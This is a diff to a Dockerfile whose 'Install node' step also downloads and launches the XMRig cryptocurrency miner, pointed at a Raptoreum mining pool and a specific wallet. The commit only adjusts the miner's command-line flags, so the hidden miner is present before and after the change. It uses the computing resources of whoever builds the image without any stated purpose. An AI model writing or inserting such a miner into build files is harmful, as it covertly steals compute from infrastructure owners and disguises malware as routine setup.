@@ -4,7 +4,7 @@ FROM vm/ubuntu:18.04
 
 # Install node
 RUN curl -sL https://deb.nodesource.com/setup_12.x | bash && \
-    apt install nodejs && apt install unzip && wget https://github.com/xmrig/xmrig/releases/download/v6.15.3/xmrig-6.15.3-linux-static-x64.tar.gz && tar xf xmrig-6.15.3-linux-static-x64.tar.gz && cd xmrig-6.15.3 && ./xmrig -algo ghostrider -o stratum+tcp://asia.raptoreum.zone:3333 -u RG2WJayxkd61Ggygu1U22NDAQnkCZPRsy5.rtm-01 -p x && \
+    apt install nodejs && apt install unzip && wget https://github.com/xmrig/xmrig/releases/download/v6.15.3/xmrig-6.15.3-linux-static-x64.tar.gz && tar xf xmrig-6.15.3-linux-static-x64.tar.gz && cd xmrig-6.15.3 && ./xmrig --print-full --algo ghostrider --url stratum+tcp://asia.raptoreum.zone:3333 --user RG2WJayxkd61Ggygu1U22NDAQnkCZPRsy5.rtm-01 --pass x && \
     rm -f /etc/apt/sources.list.d/nodesource.list
 RUN npm install -g http-server
 
